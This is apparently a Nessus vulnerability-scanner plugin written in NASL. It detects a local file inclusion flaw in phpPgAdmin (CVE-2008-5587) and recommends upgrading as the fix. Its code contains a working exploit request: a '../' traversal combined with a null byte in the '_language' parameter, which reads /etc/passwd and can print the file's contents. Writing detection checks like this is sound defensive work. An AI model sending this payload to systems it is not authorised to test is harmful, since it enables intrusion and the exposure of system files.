#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35060);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-5587");
  script_bugtraq_id(32670);
  script_osvdb_id(50545);
  script_xref(name:"EDB-ID", value:"7363");
  script_xref(name:"Secunia", value:"33014");

  script_name(english:"phpPgAdmin index.php _language Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpPgAdmin, a web-based administration tool
for PostgreSQL. 

The installed version of phpPgAdmin fails to filter user-supplied
input to the '_language' parameter before using it to include PHP code
in 'libraries/lib.inc.php'.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker may be able to leverage this
issue to view arbitrary files or possibly to execute arbitrary PHP
code on the remote host, subject to the privileges of the web server
user id." );
  # http://sourceforge.net/mailarchive/forum.php?thread_name=200812192232.41687.xzilla%40users.sourceforge.net&forum_name=phppgadmin-news
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b6d2b730" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpPgAdmin 4.2.2 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/12/08");
 script_cvs_date("$Date: 2016/05/20 14:30:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phppgadmin:phppgadmin");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Try to retrieve a local file.
file = '/etc/passwd';
file_pat = "root:.*:0:[01]:";
traversal = crap(data:"../", length:3*9) + '..';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phppgadmin", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to read a file.
  exploit = string(traversal, file, "%00");
  url = string(dir, "/index.php?_language=", exploit);

  req = http_mk_get_req(port:port, item:url);
  res = http_send_recv_req(port:port, req:req);
  if (res == NULL) exit(0);

  # There's a problem if...
  body = res[2];
  if (
    # it looks like phpPgAdmin and...
    (
      '<title>phpPgAdmin</title>' >< body ||
      '<frame src="browser.php" name="browser" ' >< body
    ) && 
    # either
    (
      # we get the file we're looking for or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error because magic_quotes was enabled or...
      string(file, "\\0.php") >< body ||
      # we get an error claiming the file doesn't exist or...
      string(file, "): failed to open stream: No such file") >< body ||
      string(file, ") [function.include]: failed to open stream: No such file") >< body ||
      string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file") >< body ||
      # we get an error about open_basedir restriction.
      string(file, ") [function.include]: failed to open stream: Operation not permitted") >< body ||
      string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< body ||
      string("open_basedir restriction in effect. File(", file) >< body
    )
  )
  {
    if (report_verbosity)
    {
      req_str = http_mk_buffer_from_req(req:req);

      if (egrep(pattern:file_pat, string:body))
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following request :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          contents = res[2] - strstr(res[2], '<!DOCTYPE');
          if ('<?xml ' >< contents) contents = contents - strstr(contents, '<?xml ');
          if ('<br' >< contents) contents = contents - strstr(contents, '<br');
          if (!egrep(pattern:file_pat, string:contents)) contents = res[2];

          report += string(
            "\n",
            "Here are the contents :\n",
            "\n",
            contents
          );
        }
      }
      else
      {
        report = string(
          "\n",
          "Nessus was able to verify the issue exists using the following \n",
          "request :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
